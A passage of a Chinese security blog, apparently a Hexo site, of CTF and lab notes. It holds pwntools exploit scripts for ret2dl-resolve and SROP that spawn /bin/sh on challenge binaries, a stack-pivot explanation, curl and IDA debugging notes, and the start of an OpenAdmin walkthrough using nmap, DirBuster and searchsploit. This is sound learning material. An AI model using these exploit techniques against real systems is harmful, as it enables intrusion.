len(rop.chain())</span><br><span class="line">rop.raw(sh + <span class="string">'\x00'</span>)</span><br><span class="line">rop.raw(<span class="string">'a'</span> * (<span class="number">100</span> - len(rop.chain())))</span><br><span class="line">r.sendline(rop.chain())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="roputil-工具"><a href="#roputil-工具" class="headerlink" title="roputil 工具"></a>roputil 工具</h2><p>直接使用 roputil 来进行攻击</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> process</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context</span><br><span class="line">r = process(<span class="string">'./main'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">r.recv()</span><br><span class="line">rop = ROP(<span class="string">'./main'</span>)</span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">bss_base = rop.section(<span class="string">'.bss'</span>)</span><br><span class="line">buf = rop.fill(offset)</span><br><span class="line">buf += rop.call(<span class="string">'read'</span>, <span class="number">0</span>, bss_base, <span class="number">100</span>)</span><br><span class="line"><span class="comment">## used to call dl_Resolve()</span></span><br><span class="line">buf += rop.dl_resolve_call(bss_base + <span class="number">20</span>, bss_base)</span><br><span class="line">r.send(buf)</span><br><span class="line">buf = rop.string(<span class="string">'/bin/sh'</span>)</span><br><span class="line">buf += rop.fill(<span class="number">20</span>, buf)</span><br><span class="line"><span class="comment">## used to make faking data, such relocation, Symbol, Str</span></span><br><span class="line">buf += rop.dl_resolve_data(bss_base + <span class="number">20</span>, <span class="string">'system'</span>)</span><br><span class="line">buf += rop.fill(<span class="number">100</span>, buf)</span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="补：栈迁移原理"><a href="#补：栈迁移原理" class="headerlink" title="补：栈迁移原理"></a>补：栈迁移原理</h1><p>主要用的就是这个  leave;ret;  这样的 gadgets</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583751269591-9a856c5f-909f-49eb-ad59-2e660721ac09.png#align=left&display=inline&height=113&margin=%5Bobject%20Object%5D&name=image.png&originHeight=121&originWidth=352&size=6555&status=done&style=none&width=328" alt="image.png"></p>
+<p>假设，我们有一个程序，存在栈溢出漏洞，我们把内容覆盖成了下面这样子，当然此时 bss 段或者 data 段还没有内容，待会会通过  read  函数输入：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583751904484-d0c55ace-3ed8-4917-91b8-fcd1a1ef5e55.png#align=left&display=inline&height=241&margin=%5Bobject%20Object%5D&name=image.png&originHeight=481&originWidth=808&size=30238&status=done&style=none&width=404" alt="image.png"></p>
+<p>而实际上在程序调用完成  call 返回的时候，就会有这样的  <code>mov esp,ebp</code> <code>pop ebp</code> <code>ret</code>  指令</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583751473086-167601a3-bdb8-4994-819e-c5665fcb9ca7.png#align=left&display=inline&height=219&margin=%5Bobject%20Object%5D&name=image.png&originHeight=375&originWidth=661&size=66230&status=done&style=none&width=386" alt="image.png"></p>
+<p>所以我们挨个去执行的时候会出现这样的情况</p>
+<p>首先是 <code>mov esp,ebp</code>  执行完以后变成了这个样子：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583751918976-b36e8f03-dad2-4a68-bc4c-8fbad6372ffa.png#align=left&display=inline&height=242&margin=%5Bobject%20Object%5D&name=image.png&originHeight=483&originWidth=789&size=29310&status=done&style=none&width=394.5" alt="image.png"></p>
+<p>然后 <code>pop ebp</code>  执行完后就是<br><strong>别忘了，pop 指令是把栈顶的值弹到   指定的寄存器，也就是说  esp  会自动的减一个单位</strong></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583751935372-eda3a4b9-c702-4ccb-9026-e959f6b4d40f.png#align=left&display=inline&height=250&margin=%5Bobject%20Object%5D&name=image.png&originHeight=499&originWidth=848&size=33278&status=done&style=none&width=424" alt="image.png"></p>
+<p>这时候就到 <code>ret</code>  了，我们可以通过  read  函数来把内容输入到 fake ebp1  的地址处<br>构造的内容主要是把 fake ebp1  处写成  fake ebp2  的地址</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583751883921-bc78a815-a166-4e1c-9eab-40507aed9242.png#align=left&display=inline&height=245&margin=%5Bobject%20Object%5D&name=image.png&originHeight=489&originWidth=904&size=54384&status=done&style=none&width=452" alt="image.png"></p>
+<p>read  函数执行完成以后程序返回到了  leave_ret，这样就会在执行一遍上面说的那样<br>首先是 <code>mov esp,ebp</code>  执行完成后效果如下：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583752086719-16f00086-3e30-4c54-8dcf-9461525818da.png#align=left&display=inline&height=237&margin=%5Bobject%20Object%5D&name=image.png&originHeight=474&originWidth=883&size=32692&status=done&style=none&width=441.5" alt="image.png"></p>
+<p>然后是  <code>pop ebp</code>  执行完成后：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583752167974-cc20b00e-3209-405c-b364-f0413a6e8137.png#align=left&display=inline&height=230&margin=%5Bobject%20Object%5D&name=image.png&originHeight=460&originWidth=791&size=29766&status=done&style=none&width=395.5" alt="image.png"></p>
+<p>此时在执行  <code>ret</code>  命令，他就会执行我们构造在  bss  段后者  data  段的那个函数</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583752275648-10ee7f0d-b076-4055-8281-def34b84981e.png#align=left&display=inline&height=235&margin=%5Bobject%20Object%5D&name=image.png&originHeight=470&originWidth=760&size=30014&status=done&style=none&width=380" alt="image.png"></p>
+<h1 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h1><p>SROP（Sigreturn Oriented Programming），sigreturn 是一个系统调用，在  unix  系统发生  signal  的时候会被间接调用</p>
+<p>当系统进程发起（deliver）一个 signal 的时候，该进程会被短暂的挂起（suspend），进入内核 ①，然后内核对该进程保留相应的上下文，跳转到之前注册好的 signal handler  中处理  signal②，当 signal 返回后 ③，内核为进程恢复之前保留的上下文，恢复进程的执行 ④</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583802593340-5e11543d-ba40-4484-90a1-7eff91e5f953.png#align=left&display=inline&height=266&margin=%5Bobject%20Object%5D&originHeight=266&originWidth=816&size=0&status=done&style=none&width=816" alt=""></p>
+<p>内核为进程保留相应的上下文的方法主要是：<strong>将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址</strong>，此时栈的情况是这样的：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583803907159-784f8139-65cf-4c41-8ce5-db66393f5cc1.png#align=left&display=inline&height=402&margin=%5Bobject%20Object%5D&originHeight=590&originWidth=711&size=0&status=done&style=none&width=484" alt=""></p>
+<p>我们<strong>称  ucontext  以及  siginfo  这一段为  signal frame</strong>，需要注意的是这一部分是在用户进程的地址空间，之后会跳转到注册过  signal handler  中处理相应的  signal，因此，当 signal handler  执行完成后就会<strong>执行  sigreturn  系统调用来恢复上下文，主要是将之前压入的寄存器的内容给还原回对应的寄存器</strong>，然后恢复进程的执行</p>
+<p>32 位的 sigreturn  的系统调用号为 77，64  位的系统调用号为 15</p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>360 春秋杯中的 smallest</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583832738169-e295a320-9921-451b-b0e9-f0b2403f9409.png#align=left&display=inline&height=158&margin=%5Bobject%20Object%5D&name=image.png&originHeight=225&originWidth=726&size=58533&status=done&style=none&width=509" alt="image.png"></p>
+<p>可以看到在 IDA  里面打开，只有这么几行</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583832621766-85bca31f-6888-4e9a-9ca9-2e4579f6a3e2.png#align=left&display=inline&height=414&margin=%5Bobject%20Object%5D&name=image.png&originHeight=827&originWidth=1425&size=90974&status=done&style=none&width=712.5" alt="image.png"></p>
+<p>syscall  调用的是  rax  的  0（xor rax,rax 的结果）<br>所以这里就是  syscall(0,0,$rsp,0x400) 所以程序实际执行的是 read(0,$rsp,0x400)，也就是往栈顶写 0x400  字节的内容</p>
+<table>
+<thead>
+<tr>
+<th>系统调用</th>
+<th>调用号</th>
+<th>函数原型</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>read</td>
+<td>0</td>
+<td>read(int fd, void *buf, size_t count)</td>
+</tr>
+<tr>
+<td>write</td>
+<td>1</td>
+<td>write(int fd, const void *buf, size_t count)</td>
+</tr>
+<tr>
+<td>sigreturn</td>
+<td>15</td>
+<td>int sigreturn(…)</td>
+</tr>
+<tr>
+<td>execve</td>
+<td>59</td>
+<td>execve(const char <em>filename, char *const argv[],char \</em>const envp[])</td>
+</tr>
+</tbody></table>
+<p>SROP  主要是利用了第 15  号，sigreturn  从栈上读取数据，赋值到寄存器中，可以用来构造 syscall(59,”/bin/sh”,0,0)</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./smallest'</span>)</span><br><span class="line">small = ELF(<span class="string">'./smallest'</span>)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">syscall_ret = <span class="number">0x00000000004000BE</span></span><br><span class="line">start_addr = <span class="number">0x00000000004000B0</span></span><br><span class="line">payload = p64(start_addr) * <span class="number">3</span></span><br><span class="line">sh.send(payload)<span class="comment">#首先,发送start_addr的地址,因为是写在栈顶的,所以就是read的返回地址</span></span><br><span class="line"><span class="comment">#会返回到start_addr</span></span><br><span class="line">sh.send(<span class="string">'\xb3'</span>)<span class="comment">#返回后再次调用read函数的时候输入一个字节,read函数会把读入的字节数放到rax</span></span><br><span class="line"><span class="comment">#这样就达到了rax置为1的目的，同时会把rsp的后一位写为\xB3,这样返回地址就不是start_addr了</span></span><br><span class="line"><span class="comment">#而是4000B3,这就避免了rax被xor置零</span></span><br><span class="line">stack_addr = u64(sh.recv()[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line"><span class="comment">#此时,这样我们就回去syscall调用write函数里，输出的就是栈上的0x400长度的内容</span></span><br><span class="line"><span class="comment">#别忘了当是输入的是3个start_addr,所以前八个字节是start_addr，后面的才是我们要用的</span></span><br><span class="line">log.success(<span class="string">'leak stack addr :'</span> + hex(stack_addr))</span><br><span class="line"><span class="comment">#现在我们拿到栈的地址,同时，因为当时是写了三个start_addr,现在又回到了start_addr</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#开始构造!我们要想要syscall调用sigreturn需要把rax设置为15,通过read实现</span></span><br><span class="line">read = SigreturnFrame()</span><br><span class="line">read.rax = constants.SYS_read</span><br><span class="line">read.rdi = <span class="number">0</span></span><br><span class="line">read.rsi = stack_addr</span><br><span class="line">read.rdx = <span class="number">0x400</span></span><br><span class="line">read.rsp = stack_addr</span><br><span class="line">read.rip = syscall_ret</span><br><span class="line"><span class="comment">#相当于read(0,stack_addr,0x400),同时返回地址是start_addr</span></span><br><span class="line">read_frame_payload  = p64(start_addr) + p64(syscall_ret) + str(read)</span><br><span class="line">sh.send(read_frame_payload)<span class="comment">#调用read函数,等待接收</span></span><br><span class="line">sh.send(read_frame_payload[<span class="number">8</span>:<span class="number">8</span>+<span class="number">15</span>])<span class="comment">#总共是15个</span></span><br><span class="line"><span class="comment">#这样通过read返回的字节使得rax为15,这样的话就会去恢复构造的read那一段内容，来接受我们的输入</span></span><br><span class="line"></span><br><span class="line">execve = SigreturnFrame()</span><br><span class="line">execve.rax=constants.SYS_execve</span><br><span class="line">execve.rdi=stack_addr + <span class="number">0x120</span></span><br><span class="line">execve.rsi=<span class="number">0x0</span></span><br><span class="line">execve.rdx=<span class="number">0x0</span></span><br><span class="line">execve.rsp=stack_addr</span><br><span class="line">execve.rip=syscall_ret</span><br><span class="line">execv_frame_payload=p64(start_addr)+p64(syscall_ret)+str(execve)<span class="comment">#返回start_addr等待输入</span></span><br><span class="line"><span class="keyword">print</span> len(execv_frame_payload)</span><br><span class="line">execv_frame_payload_all=execv_frame_payload+(<span class="number">0x120</span>-len(execv_frame_payload ))*<span class="string">'\x00'</span>+<span class="string">'/bin/sh\x00'</span></span><br><span class="line"><span class="comment">#先计算一下长度,让前面的添上几个'\x00'之后正好是120，然后再填上'/bin/sh'</span></span><br><span class="line">sh.send(execv_frame_payload_all)</span><br><span class="line">sh.send(execv_frame_payload_all[<span class="number">8</span>:<span class="number">8</span>+<span class="number">15</span>])</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1584172885580-9374e3ed-e078-48e8-b2b7-535b9e5d2117.png#align=left&display=inline&height=128&margin=%5Bobject%20Object%5D&originHeight=128&originWidth=558&size=0&status=done&style=none&width=558" alt=""></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/webp/268938/1584175482747-4d3af9c1-f160-419d-9609-1d084d623cbe.webp#align=left&display=inline&height=206&margin=%5Bobject%20Object%5D&originHeight=332&originWidth=1200&size=0&status=done&style=stroke&width=746" alt=""></p>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://yoursite.com/2020/02/25/erh0l7/" data-id="ckco0hty4000oh4u9acqaddpv" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+                                    </footer>
+
+    </div>
+
+    
+
+                
+
+</article>
+        
+          <article id="post-pzhqyf" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h2 itemprop="name">
+      <a class="article-title" href="/2020/02/22/pzhqyf/">Linux系统</a>
+    </h2>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2020/02/22/pzhqyf/" class="article-date">
+  <time datetime="2020-02-22T01:39:41.000Z" itemprop="datePublished">2020-02-22</time>
+</a>
+                            
+                    </div>
+                    
+
+                        
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <p><img src="https://cdn.nlark.com/yuque/0/2019/png/376408/1562993949602-26aebe9e-edff-4d1c-a7de-c6ddb618bfb4.png#align=left&display=inline&height=1326&originHeight=1326&originWidth=784&status=done&style=none&width=784" alt=""></p>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://yoursite.com/2020/02/22/pzhqyf/" data-id="ckco50ddk000a2wu95nva8zxb" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+                                    </footer>
+
+    </div>
+
+    
+
+                
+
+</article>
+        
+          <article id="post-heis24" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h2 itemprop="name">
+      <a class="article-title" href="/2020/02/19/heis24/">curl使用</a>
+    </h2>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2020/02/19/heis24/" class="article-date">
+  <time datetime="2020-02-19T05:47:43.000Z" itemprop="datePublished">2020-02-19</time>
+</a>
+                            
+                    </div>
+                    
+
+                        
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <h1 id="无-正常-get"><a href="#无-正常-get" class="headerlink" title="无   正常 get"></a>无   正常 get</h1><p>通过 GET  方式正常请求<br>会把返回的内容保存下来<br><code>curl http://127.0.0.1</code></p>
+<h1 id="A-改-ua"><a href="#A-改-ua" class="headerlink" title="-A  改 ua"></a>-A  改 ua</h1><p>指定用户代理标头（user-agent）<br><code>curl -A &quot;chrome 5.1&quot; http://127.0.0.1</code></p>
+<h1 id="b-改-cookie"><a href="#b-改-cookie" class="headerlink" title="-b  改 cookie"></a>-b  改 cookie</h1><p>指定  cookie  访问<br><code>curl -b &#39;cookie=yichen123&#39; http://127.0.0.1</code><br><code>curl -b cookie.txt http://127.0.0.1</code></p>
+<h1 id="c-接收服务端-cookie"><a href="#c-接收服务端-cookie" class="headerlink" title="-c  接收服务端 cookie"></a>-c  接收服务端 cookie</h1><p>将服务器传过来的  cookie  写到文件里面<br>`curl -c cookie.txt <a href="http://127.0.0.1```" target="_blank" rel="noopener">http://127.0.0.1```</a></p>
+<h1 id="d-POST"><a href="#d-POST" class="headerlink" title="-d  POST"></a>-d  POST</h1><p>使用 -d  以后会自动改成 POST  方式请求<br><code>curl -d &quot;a=yichen&amp;b=password&quot; -X POST http://127.0.0.1</code></p>
+<h1 id="–data-urlencode"><a href="#–data-urlencode" class="headerlink" title="–data-urlencode"></a>–data-urlencode</h1><p>跟-d 差不多，不过会进行 url  编码</p>
+<h1 id="e-改-refer"><a href="#e-改-refer" class="headerlink" title="-e  改 refer"></a>-e  改 refer</h1><p>设置  refer  标明请求来源<br><code>curl -e &quot;39.105.32.48&quot; http://127.0.0.1</code></p>
+<h1 id="F-传文件"><a href="#F-传文件" class="headerlink" title="-F  传文件"></a>-F  传文件</h1><p><code>curl -F &quot;file=@yichen.png;filename=1.png&quot;</code><br>源文件名为 yichen.png  传上去的文件名叫 1.png</p>
+<h1 id="H-改请求头"><a href="#H-改请求头" class="headerlink" title="-H  改请求头"></a>-H  改请求头</h1><p><code>curl -H &#39;Accept-Language: en-US&#39; -H &#39;Secret-Message: xyzzy&#39; https://127.0.0.1</code></p>
+<h1 id="X-改请求方法"><a href="#X-改请求方法" class="headerlink" title="-X  改请求方法"></a>-X  改请求方法</h1><p><code>curl -X POST http://127.0.0.1</code></p>
+<h1 id="v-显示全过程"><a href="#v-显示全过程" class="headerlink" title="-v  显示全过程"></a>-v  显示全过程</h1><p><code>curl -v http://127.0.0.1</code><br>显示比较全的信息，便于调试</p>
+<h1 id="u-http-认证"><a href="#u-http-认证" class="headerlink" title="-u http 认证"></a>-u http 认证</h1><p><code>curl -u &quot;yichen:password&quot; http://127.0.0.1</code><br>这就是那个  base64  编码的</p>
+<h1 id="o-保存返回"><a href="#o-保存返回" class="headerlink" title="-o 保存返回"></a>-o 保存返回</h1><p><code>curl -o yichen.html http://127.0.0.1/index.html</code><br>与 wget 效果相同</p>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://yoursite.com/2020/02/19/heis24/" data-id="ckco50ddc00082wu982tn2je4" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+                                    </footer>
+
+    </div>
+
+    
+
+                
+
+</article>
+        
+          <article id="post-bfte1r" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h2 itemprop="name">
+      <a class="article-title" href="/2020/02/19/bfte1r/">IDA远程调试</a>
+    </h2>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2020/02/19/bfte1r/" class="article-date">
+  <time datetime="2020-02-19T01:48:06.000Z" itemprop="datePublished">2020-02-19</time>
+</a>
+                            
+                    </div>
+                    
+
+                        
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <h1 id="IDA-远程调试"><a href="#IDA-远程调试" class="headerlink" title="IDA 远程调试"></a>IDA 远程调试</h1><p>把 IDA 文件夹下的 dbgsrv 里面的 linux 的复制到虚拟机，然后给权限  <code>chmod 777 文件名</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582202105456-eddb6ac9-f240-4706-9d4d-fc75280820d1.png#align=left&display=inline&height=382&name=image.png&originHeight=628&originWidth=873&size=73047&status=done&style=none&width=531" alt="image.png"><br><code>./linux_server</code>  运行</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582202056038-a3bfd17f-7f78-4226-8d01-9724e95512c5.png#align=left&display=inline&height=225&name=image.png&originHeight=364&originWidth=967&size=77821&status=done&style=none&width=598" alt="image.png"></p>
+<p>这样，再用 IDA  选这个，设置好主机名（虚拟机 IP）和密码（虚拟机密码）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582203132658-f133fec2-e77d-4ef6-bad1-26db73c042c4.png#align=left&display=inline&height=274&name=image.png&originHeight=437&originWidth=959&size=84669&status=done&style=none&width=600" alt="image.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582203197665-28533fa7-6167-4d73-a05f-9330480534c1.png#align=left&display=inline&height=325&name=image.png&originHeight=376&originWidth=704&size=23556&status=done&style=none&width=609" alt="image.png"></p>
+<p>然后 F9  运行，因为在 linux 上面没有文件，所以他会复制到 linux，一路 ok 就可以</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582203483613-5b02af89-9b5e-4d78-b16a-0c083d5b024c.png#align=left&display=inline&height=379&name=image.png&originHeight=1080&originWidth=1920&size=216749&status=done&style=none&width=674" alt="image.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582203524382-6855f5c3-3585-4106-ad06-073491ea4b7a.png#align=left&display=inline&height=341&name=image.png&originHeight=682&originWidth=1000&size=202387&status=done&style=none&width=500" alt="image.png"></p>
+<h1 id="附加进程调试"><a href="#附加进程调试" class="headerlink" title="附加进程调试"></a>附加进程调试</h1><p>首先绑定一个，就相当于是在服务器上的题目了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582203976462-bda683ba-9aa5-40be-85b3-83a4f381be35.png#align=left&display=inline&height=138&name=image.png&originHeight=276&originWidth=694&size=31860&status=done&style=none&width=347" alt="image.png"></p>
+<p>然后用  python  的  pwntools  与程序连接</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582204420761-33601522-e0f2-44fb-8ea1-364d0a9e388e.png#align=left&display=inline&height=196&name=image.png&originHeight=392&originWidth=663&size=57315&status=done&style=none&width=331.5" alt="image.png"></p>
+<p>在 IDA  里面，选择附加，然后选择  linux 的</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582203928607-b44b8f9a-d01f-4933-ae61-7bcab3fb1a77.png#align=left&display=inline&height=302&name=image.png&originHeight=504&originWidth=866&size=49123&status=done&style=none&width=519" alt="image.png"></p>
+<p>选择就行了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582204619252-d640c5a3-bc1f-48eb-96bc-657a7c2f0986.png#align=left&display=inline&height=419&name=image.png&originHeight=640&originWidth=583&size=47804&status=done&style=none&width=381" alt="image.png"></p>
+<hr>
+<h2 id="警告"><a href="#警告" class="headerlink" title="警告"></a>警告</h2><p>调试器无法附加到所选的进程。<br>这可能表示进程刚刚终止，或者您没有必要的权限。</p>
+<hr>
+<h2 id="OK"><a href="#OK" class="headerlink" title="OK"></a>OK</h2><p>没解决</p>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://yoursite.com/2020/02/19/bfte1r/" data-id="ckco0htvj0000h4u97gjs5o9q" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+                                    </footer>
+
+    </div>
+
+    
+
+                
+
+</article>
+        
+          <article id="post-kn5txd" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h2 itemprop="name">
+      <a class="article-title" href="/2020/02/18/kn5txd/">OpenAdmin</a>
+    </h2>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2020/02/18/kn5txd/" class="article-date">
+  <time datetime="2020-02-18T02:42:11.000Z" itemprop="datePublished">2020-02-18</time>
+</a>
+                            
+                    </div>
+                    
+
+                        
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p><code>nmap -sC -A -T 4 -n 10.10.10.171</code></p>
+<p><strong>nmap 参数：</strong><br>-sC    根据端口识别的服务，调用默认脚本<br>-A     OS 识别,版本探测，脚本扫描和 traceroute<br>-T（0-5）时间优化<br>-n/-R    不对 IP 进行域名反向解析/为所有的 IP 都进行域名的反响解析</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1581994284283-8bd39ef0-35e2-4216-baec-9455f7194d8c.png#align=left&display=inline&height=434&name=image.png&originHeight=721&originWidth=913&size=168537&status=done&style=none&width=550" alt="image.png"></p>
+<p>访问 web：并没有发现什么</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1581994337739-184a3a2a-f0c7-4893-bd4c-b9a5bb1ca54a.png#align=left&display=inline&height=408&name=image.png&originHeight=816&originWidth=1111&size=140156&status=done&style=none&width=555.5" alt="image.png"></p>
+<p><strong>DirBuster</strong>，选择/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt<br>进行目录爆破</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1581995374239-5de181c8-81bb-4da3-ae23-9959587afdfb.png#align=left&display=inline&height=435&name=image.png&originHeight=729&originWidth=765&size=94564&status=done&style=none&width=456" alt="image.png"></p>
+<p>发现两个目录 music  和 ona<br>挨个访问，先看 <strong>ona</strong><br><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1581995605944-6176fab6-bb1e-4426-acd7-7601bb60cc57.png#align=left&display=inline&height=248&name=image.png&originHeight=496&originWidth=1280&size=100347&status=done&style=stroke&width=640" alt="image.png"></p>
+<p>music，点击 login 会跳到 /ona/ 目录<br><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1581995565247-f861831a-1cf4-40cf-9ac1-9d3df51e5508.png#align=left&display=inline&height=411&name=image.png&originHeight=822&originWidth=1283&size=322627&status=done&style=none&width=641.5" alt="image.png"></p>
+<p>/ona/目录下提示的最新版是：OpenNetAdmin，当前版本是 18.1.1.1</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1581996223877-f688e244-057d-4978-8166-e7bb3050fc5c.png#align=left&display=inline&height=166&name=image.png&originHeight=269&originWidth=443&size=21015&status=done&style=none&width=273" alt="image.png"></p>
+<p>OpenNetAdmin  官网（来自谷歌自动翻译，了解一下是干啥的）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1581996135167-91d4cd3d-9933-4e45-bdfa-f1b075f19ed6.png#align=left&display=inline&height=362&name=image.png&originHeight=723&originWidth=1889&size=202436&status=done&style=none&width=944.5" alt="image.png"></p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p><code>searchsploit opennetadmin</code>  搜一下利用的</p>
+<p>searchsploit  是一个命令行搜索  exp  的工具，可以直接搜，使用空格来区分关键词</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1581996328026-dc214837-8f27-4f0e-878e-fcb303093366.png#align=left&display=inline&height=122&name=image.png&originHeight=167&originWidth=904&size=36380&status=done&style=none&width=662" alt="image.png"></p>
+<p><code>searchsploit -m 47691</code>  使用参数 -m 将利用脚本复制到当前目录</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1581996395447-5b59ff85-e2e8-4a6b-93dd-4f79d752eb5d.png#align=left&display=inline&height=150&name=image.png&originHeight=159&originWidth=654&size=37368&status=done&style=none&width=616" alt="image.png"></p>
+<p>关于 shell 脚本传参：<br>$0 是自身文件名<br>$1 就是第一个参数，比如：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1581996695713-049fa20d-0cfd-41ce-8153-317ef5c2253c.png#align=left&display=inline&height=228&name=image.png&originHeight=340&originWidth=606&size=48363&status=done&style=none&width=406" alt="image.png"></p>
